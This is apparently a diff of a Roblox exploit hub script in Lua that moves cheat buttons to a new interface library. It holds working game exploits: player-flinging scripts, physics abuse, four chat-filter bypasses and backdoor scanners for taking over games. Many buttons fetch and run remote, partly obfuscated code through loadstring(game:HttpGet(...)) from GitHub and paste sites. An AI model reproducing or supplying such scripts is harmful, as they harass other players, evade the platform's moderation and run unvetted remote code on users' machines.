+				if Player.Character.Humanoid.MoveDirection == Vector3.new(0, 0, 0) then
+					IsRunning = false
+				else
+					IsRunning = true
+				end
+			end)
+			spawn(function()
+				while true do
+					wait()
+					if IsFlying then
+						flyg.CFrame = workspace.CurrentCamera.CoordinateFrame * CFrame.Angles(-math.rad((f + 0) * 50 * Speed / maxspeed), 0, 0)
+						flyv.Velocity = workspace.CurrentCamera.CoordinateFrame.LookVector * Speed
+						wait(0.1)
+						if Speed < 0 then
+							Speed = 0
+							f = 0
+						end
+					end
+					if IsRunning then
+						Speed = LastSpeed
+					else
+						if not Speed == 0 then
+							LastSpeed = Speed
+						end
+						Speed = 0
+					end
+				end
+			end)
+			Speed = 0.1
+			wait(0.3)
+			hit:Sit(game:GetService("Players").LocalPlayer.Character.Humanoid)
+			SPart:Destroy()
+			wait(0.3)
+			local speaker = game.Players.LocalPlayer
+			local seat = speaker.Character:FindFirstChildOfClass('Humanoid').SeatPart
+			local vehicleModel = seat.Parent
+			repeat
+				if vehicleModel.ClassName ~= "Model" then
+					vehicleModel = vehicleModel.Parent
+				end
+			until vehicleModel.ClassName == "Model"
+			wait(0.1)
+			for i, v in pairs(vehicleModel:GetDescendants()) do
+				if v:IsA("BasePart") and v.CanCollide then
+					v.CanCollide = false
+				end
+			end
+			wait(0.2)
+			Speed = 80
+			local Spin = Instance.new("BodyAngularVelocity")
+			Spin.Name = "Spinning"
+			Spin.Parent = getRoot(speaker.Character)
+			Spin.MaxTorque = Vector3.new(0, math.huge, 0)
+			Spin.AngularVelocity = Vector3.new(0, 2000, 0)
+			game.StarterGui:SetCore("SendNotification", {
+				Title = "FE Vehicle Fling";
+				Icon = "rbxassetid://7279804519";
+				Text = "Identified the seat part, Success!";
+				Duration = 10;
+				notification:Play()
+			})
+		end
+	end)
+		end
+	})
+	Main:AddButton({
+		Title = "Walk on Walls FE",
+		Description = "kinda buggy if execute more than once",
+		Callback = function()
+			loadstring(game:HttpGet("https://raw.githubusercontent.com/yofriendfromschool1/Sky-Hub/main/FE%20Walk%20On%20Walls%20Script%20(R6%2615).txt"))()
+		end
+	})
+	Main:AddButton({
+		Title = "Netless V2",
+		Description = "need to do every time u reset",
+		Callback = function()
+			for i, v in next, game:GetService("Players").LocalPlayer.Character:GetDescendants() do
+				if v:IsA("BasePart") and v.Name ~= "HumanoidRootPart" then
+					game:GetService("RunService").Heartbeat:connect(function()
+						v.Velocity = Vector3.new(0, 35, 0)
+						wait(0.5)
+					end)
+				end
+			end
+			game:GetService("StarterGui"):SetCore("SendNotification", {
+				Title = "Notification";
+				Text = "Netless activated";
+				Icon = "rbxthumb://type=Asset&id=5107182114&w=150&h=150"
+			})
+			Duration = 16;
+		end
+	})
+	Main:AddButton({
+		Title = "FE Hat Ferris Wheel",
+		Description = "Hats spin around your character in a circle motion must wear like 5 hats or more on avatar",
+		Callback = function()
+			loadstring(game:HttpGet(('https://raw.githubusercontent.com/0Ben1/fe/main/obf_8u7A6D92KJWJXgB4btM3lJNPDy2mCi61S191KbGF2EfX9621qbXQg0tBivwEi0Kr.lua.txt'), true))()
+		end
+	})
+	GUIS:AddButton({
+		Title = "Sushi X",
+		Description = "idk",
+		Callback = function()
+			loadstring(game:HttpGet(('https://raw.githubusercontent.com/0Ben1/sushi/main/X'), true))()
+		end
+	})
+	Main:AddButton({
+		Title = "FE Chat Bypass",
+		Description = "Bypasses Chat Filter",
+		Callback = function()
+			loadstring(game:HttpGet('https://pastes.io/raw/lstrrfipqq'))();
+		end
+	})
+	Main:AddButton({
+		Title = "FE Chat Bypass 2",
+		Description = "Bypasses Chat Filter",
+		Callback = function()
+			loadstring(game:HttpGet("https://raw.githubusercontent.com/Synergy-Networks/products/main/BetterBypasser/loader.lua", true))()
+		end
+	})
+	Main:AddButton({
+		Title = "FE Chat Bypass 3",
+		Description = "Bypasses Chat Filter",
+		Callback = function()
+			loadstring(game:HttpGet("https://raw.githubusercontent.com/ChainGotStucked/a55af82d82574/main/Eminence%20Hub"))()
+		end
+	})
+	Main:AddButton({
+		Title = "FE Chat Bypass 4",
+		Description = "Bypasses Chat Filter",
+		Callback = function()
+			loadstring(game:HttpGet("https://raw.githubusercontent.com/wspo23e/SDL-Roblox-ChatBypasser/main/SDL-NoFilterV2.5"))()
+		end
+	})
+	Main:AddButton({
+		Title = "Backdoor.exe",
+		Description = "Scans for backdoors",
+		Callback = function()
+			loadstring(game:HttpGet("https://raw.githubusercontent.com/iK4oS/backdoor.exe/master/source.lua"))()
+		end
+	})
+	Main:AddButton({
+		Title = "Backdoor.exe V6",
+		Description = "Scans for backdoors",
+		Callback = function()
+			loadstring(game:HttpGet("https://raw.githubusercontent.com/iK4oS/backdoor.exe/v6/source.lua"))()
+		end
+	})
+	Main:AddButton({
+		Title = "Backdoor.exe V6x",
+		Description = "Scans for backdoors",
+		Callback = function()
+			loadstring(game:HttpGet("https://raw.githubusercontent.com/iK4oS/backdoor.exe/v6x/source.lua"))()
+		end
+	})
+	Main:AddButton({
+		Title = "Backdoor.exe V8",
+		Description = "Scans for backdoors",
+		Callback = function()
+			loadstring(game:HttpGet("https://raw.githubusercontent.com/iK4oS/backdoor.exe/v8/src/main.lua"))();
+		end
+	})
+	Main:AddButton({
+		Title = "Blackhole",
+		Description = "unanchored objects",
+		Callback = function()
+			loadstring(game:HttpGet("https://pastebin.com/raw/qRvKHjVN"))();
+		end
+	})
+	Main:AddButton({
+		Title = "FE Backflip",
+		Description = "Keybinds are Z X C",
+		Callback = function()
+			wait(5)--
+	local ver = "2.00"
+	local scriptname = "feFlip"--
+	local FrontflipKey = Enum.KeyCode.Z
+	local BackflipKey = Enum.KeyCode.X
+	local AirjumpKey = Enum.KeyCode.C--
+	local ca = game:GetService("ContextActionService")
+	local zeezy = game:GetService("Players").LocalPlayer
+	local h = 0.0174533
+	local antigrav--
+	function zeezyFrontflip(act, inp, obj)
+		if inp == Enum.UserInputState.Begin then
+			zeezy.Character.Humanoid:ChangeState("Jumping")
+			wait()
+			zeezy.Character.Humanoid.Sit = true
+			for i = 1, 360 do
+				delay(i / 720, function()
+					zeezy.Character.Humanoid.Sit = true
+					zeezy.Character.HumanoidRootPart.CFrame = zeezy.Character.HumanoidRootPart.CFrame * CFrame.Angles(-h, 0, 0)
+				end)
+			end
+			wait(0.55)
+			zeezy.Character.Humanoid.Sit = false
+		end
+	end
+	function zeezyBackflip(act, inp, obj)
+		if inp == Enum.UserInputState.Begin then
+			zeezy.Character.Humanoid:ChangeState("Jumping")
+			wait()
+			zeezy.Character.Humanoid.Sit = true
+			for i = 1, 360 do
+				delay(i / 720, function()
+					zeezy.Character.Humanoid.Sit = true
+					zeezy.Character.HumanoidRootPart.CFrame = zeezy.Character.HumanoidRootPart.CFrame * CFrame.Angles(h, 0, 0)
+				end)
+			end
+			wait(0.55)
+			zeezy.Character.Humanoid.Sit = false
+		end
+	end
+	function zeezyAirjump(act, inp, obj)
+		if inp == Enum.UserInputState.Begin then
+			zeezy.Character:FindFirstChildOfClass'Humanoid':ChangeState("Seated")
+			wait()
+			zeezy.Character:FindFirstChildOfClass'Humanoid':ChangeState("Jumping")
+		end
+	end--
+	ca:BindAction("zeezyFrontflip", zeezyFrontflip, false, FrontflipKey)
+	ca:BindAction("zeezyBackflip", zeezyBackflip, false, BackflipKey)
+	ca:BindAction("zeezyAirjump", zeezyAirjump, false, AirjumpKey)--
+	print(scriptname .. " " .. ver .. " loaded successfully")
+	print("made by Zeezy#7203")
+	local notifSound = Instance.new("Sound", workspace)
+	notifSound.PlaybackSpeed = 1.5
+	notifSound.Volume = 0.15
+	notifSound.SoundId = "rbxassetid://170765130"
+	notifSound.PlayOnRemove = true
+	notifSound:Destroy()
+	game.StarterGui:SetCore("SendNotification", {
+		Title = "feFlip",
+		Text = "feFlip loaded successfully!",
+		Icon = "rbxassetid://505845268",
+		Duration = 5,
+		Button1 = "Okay"
+	})
+		end
+	})
+	Main:AddButton({
+		Title = "Super fling",
+		Description = "fling players",
+		Callback = function()
+			loadstring(game:HttpGet('https://raw.githubusercontent.com/yofriendfromschool1/Sky-Hub/main/superfling', true))()
+		end
+	})
+	Main:AddButton({
+		Title = "FE Noob All Auto Rap Battles",
+		Description = "by jxyserr",
+		Callback = function()
+			loadstring(game:HttpGet('https://pastes.io/raw/1priqwpcnv'))();
+		end
+	})
+	Main:AddButton({
+		Title = "FE Big Head Rthro R15",
+		Description = "dont use hats/hair also scale head to max in avatar",
+		Callback = function()
+			 --  ((Packed with care by sysGhost/BiKode))
 --  Remember to use R15 with Rthro avatar(head) and scale ur head at max
 	for i, v in pairs(game.Players.LocalPlayer.Character.Humanoid:GetChildren()) do
 		if string.find(v.Name, "Scale") and v.Name ~= "HeadScale" then
@@ -6170,12 +6339,13 @@ MainSection:NewButton("FE Big Head Rthro R15", "dont use hats/hair also scale he
 			game.Players.LocalPlayer.Character.Head:WaitForChild("OriginalSize")
 		end
 	end
-end)
-MainSection:NewButton("FE Pp script", "im not explaining this time", function()
-	loadstring(game:HttpGet("https://gist.githubusercontent.com/dark-modz/74581bf579eea6313bc234d2808a14bc/raw/8a38ca0f328c91b6f358ad9df2413fabed213b2a/ppscriptv2", true))()
-end)
-MainSection:NewButton("FE upside down R6", "cant see on ur side but everyone else can", function()
-	local lp = game:GetService("Players").LocalPlayer
+		end
+	})
+	Main:AddButton({
+		Title = "FE upside down R6",
+		Description = "cant see on ur side but everyone else can",
+		Callback = function()
+			local lp = game:GetService("Players").LocalPlayer
 	local c = lp.Character
 	local hrp0 = c:FindFirstChild("HumanoidRootPart")
 	local hrp1 = hrp0:Clone()
@@ -6192,18 +6362,20 @@ MainSection:NewButton("FE upside down R6", "cant see on ur side but everyone els
 		hrp0.Position -= Vector3.new(0, 1, 0)
 		hrp0.Velocity = hrp1.Velocity
 	end
-end)
-
-
-MainSection:NewButton("Hat Hub", "hub that needs hats", function()
-	loadstring(game:HttpGet(('https://pastebin.com/raw/GQ7VPnbz'), true))()
-end)
-
-MainSection:NewButton("Fling Click on person you want", "makes ur character a kinda shaky on other ppls screens", function()
-	loadstring(game:HttpGet(('https://raw.githubusercontent.com/0Ben1/fe/main/obf_5wpM7bBcOPspmX7lQ3m75SrYNWqxZ858ai3tJdEAId6jSI05IOUB224FQ0VSAswH.lua.txt'), true))()
-end)
-MainSection:NewButton("FE Teleknis script v2 only works on unachorned parts", "use while moving Q E R T Y", function()
-	-- Q & E - bring closer and further
+		end
+	})
+	Main:AddButton({
+		Title = "Fling Click on person you want",
+		Description = "makes ur character a kinda shaky on other ppls screens",
+		Callback = function()
+			loadstring(game:HttpGet(('https://raw.githubusercontent.com/0Ben1/fe/main/obf_5wpM7bBcOPspmX7lQ3m75SrYNWqxZ858ai3tJdEAId6jSI05IOUB224FQ0VSAswH.lua.txt'), true))()
+		end
+	})
+	Main:AddButton({
+		Title = "FE Teleknis script v2 only works on unachorned parts",
+		Description = "use while moving Q E R T Y",
+		Callback = function()
+			-- Q & E - bring closer and further
 -- R - Roates Block
 -- T - Tilts Block
 -- Y - Throws Block
@@ -6529,11 +6701,13 @@ MainSection:NewButton("FE Teleknis script v2 only works on unachorned parts", "u
 		end
     )
 	end
-end)
- 
-
-MainSection:NewButton("Nullware Hub V3", "Reanimations", function()
-	local LocalPlayer = game:GetService("Players").LocalPlayer
+		end
+	})
+	GUIS:AddButton({
+		Title = "Nullware Hub V3",
+		Description = "Reanimations",
+		Callback = function()
+			local LocalPlayer = game:GetService("Players").LocalPlayer
 	local Heartbeat = game:GetService("RunService").Heartbeat
 	Heartbeat:Connect(function()
 		LocalPlayer.MaximumSimulationRadius = math.huge
@@ -6551,13 +6725,5 @@ MainSection:NewButton("Nullware Hub V3", "Reanimations", function()
 		end;
 		return a
 	end)()))()
-
-end)
-local Player = Window:NewTab("Player")
-local PlayerSection = Player:NewSection("Player")
-PlayerSection:NewSlider("WalkSpeed", "Changes how fast you walk", 500, 1, function(v)
-	game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = v
-end)
-PlayerSection:NewSlider("Jumppower", "Changes how high you jump", 500, 1, function(v)
-	game.Players.LocalPlayer.Character.Humanoid.JumpPower = v
-end)
+		end
+	})
